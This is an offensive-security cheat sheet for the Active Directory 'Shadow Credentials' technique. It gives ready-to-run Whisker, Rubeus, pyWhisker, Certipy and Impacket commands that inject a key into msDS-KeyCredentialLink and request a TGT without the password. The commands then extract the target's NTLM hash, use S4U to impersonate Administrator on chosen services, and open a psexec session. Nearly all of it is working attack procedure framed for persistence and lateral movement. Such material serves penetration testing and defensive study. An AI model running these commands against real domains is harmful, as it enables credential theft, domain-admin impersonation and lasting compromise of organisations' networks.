
**Powerful AD persistence & lateral movement technique** using `msDS-KeyCredentialLink` attribute.

## How Shadow Credentials Work

- Abuses the `msDS-KeyCredentialLink` attribute on user or computer objects.
- Attacker with **write access** (`GenericAll`, `GenericWrite`, `WriteProperty` on `msDS-KeyCredentialLink`) injects their own public key.
- Authenticates via **PKINIT** to obtain a TGT **without knowing the password**.
- Persistent even after password reset.
- Excellent for persistence and lateral movement via S4U2self/S4U2proxy.

**Requirements**:
- Domain functional level supporting PKINIT (Windows Server 2016+ DCs).
- Write permission on the target object.
- AD CS or PKINIT-capable environment.

---

## Windows Attacker (Whisker + Rubeus) - Recommended

### 1. Add Shadow Credential

```powershell
Whisker.exe add /target:TARGETUSER$ /domain:domain.local /dc:dc.domain.local
```

**Arguments:**

- `/target:TARGETUSER$` — Victim account (user or computer) you have write rights on.  
  *Source*: BloodHound (GenericWrite/GenericAll edges) or PowerView.
- `/domain:domain.local` — Domain FQDN.  
  *Source*: `nltest /dsgetdc:`, `ipconfig /all`.
- `/dc:dc.domain.local` — Domain Controller.  
  *Source*: `nltest /dsgetdc:domain.local`.

**Optional**: `/path:C:\temp\shadow.pfx /password:SomePass123` to save cert to file.

Whisker outputs a ready-to-use Rubeus command.

---

### 2. Request TGT + Extract NTLM Hash

Run the command **output by Whisker** (example):

```powershell
Rubeus.exe asktgt ^
    /user:TARGETUSER$ ^
    /certificate:MII...[long base64]... ^
    /password:"8V4wXTCFl3u4NT9I" ^        # Provided by Whisker
    /domain:domain.local ^
    /dc:dc.domain.local ^
    /getcredentials ^                     # Extracts NTLM + AES keys
    /ptt ^                                # Pass-The-Ticket
    /show
```

**Key Points**:
- `/certificate:...` — Base64 from Whisker.
- `/password:"..."` — Certificate password from Whisker (do **not** leave empty).
- `/getcredentials` — Gives you the **NTLM hash** of the target account.

Copy the NTLM hash from the output.

---

### 3. Request Service Tickets (S4U2self / Lateral Movement)

```powershell
Rubeus.exe s4u ^
    /user:TARGETUSER$ ^
    /rc4:NTLM_HASH_HERE ^
    /impersonateuser:Administrator ^
    /msdsspn:cifs/TARGETCOMPUTER.domain.local ^
    /ptt
```

**Arguments:**

- `/user:TARGETUSER$` — Account with Shadow Credential.
- `/rc4:NTLM_HASH_HERE` — NTLM hash extracted in Step 2.
- `/impersonateuser:Administrator` — User to impersonate (`Administrator`, `SYSTEM`, Domain Admin, etc.).
- `/msdsspn:cifs/TARGETCOMPUTER.domain.local` — Target Service Principal Name.
- `/ptt` — Inject ticket into memory.

**Common Powerful SPNs**:
- `cifs/TARGETCOMPUTER.domain.local` → SMB / File shares
- `host/TARGETCOMPUTER.domain.local` → Local admin rights
- `ldap/dc.domain.local` → DCSync (if impersonating DA)
- `http/exchange.domain.local`, `mssqlsvc/...`

**Useful variations**:
```powershell
# Multiple services
Rubeus.exe s4u /user:TARGETUSER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET$ /altservice:host,http /ptt

# Shorter (if TGT already in memory)
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:host/TARGETCOMPUTER.domain.local /ptt
```

---

### Cleanup

```powershell
Whisker.exe remove /target:TARGETUSER$ /domain:domain.local /dc:dc.domain.local
```

---

## Linux Attacker (pyWhisker + Certipy)

### 1. Add Shadow Credential

```bash
python3 pywhisker.py -d domain.local -u lowpriv -p Password123 --target TARGETUSER$ --action add --dc-ip 192.168.1.10
```

### 2. Get TGT

```bash
certipy auth -pfx TARGETUSER$.pfx -u TARGETUSER$ -domain domain.local -dc-ip DC_IP
```

### 3. Request Service Tickets (S4U)

```bash
certipy s4u -pfx TARGETUSER$.pfx -impersonate Administrator -spn host/TARGETCOMPUTER.domain.local -dc-ip DC_IP
```

Or with Impacket:
```bash
impacket-getST -spn cifs/TARGETCOMPUTER.domain.local -impersonate Administrator domain.local/TARGETUSER$ -k -no-pass
```

Then use:
```bash
export KRB5CCNAME=Administrator@domain.local.ccache
impacket-psexec domain.local/Administrator@TARGETCOMPUTER -k -no-pass
```

---

## Quick Reference Table

| Info Needed          | Best Sources                          |
|----------------------|---------------------------------------|
| Domain FQDN          | `nltest /dsgetdc:`                    |
| DC IP/Hostname       | `nltest /dsgetdc:`, BloodHound        |
| Target Account       | BloodHound (GenericWrite edges)       |
| SPNs                 | `setspn -Q`, BloodHound               |
| High-priv Users      | `Get-DomainGroupMember "Domain Admins"` |

---

**Tools**:
- Whisker, pyWhisker, Rubeus, Certipy, Impacket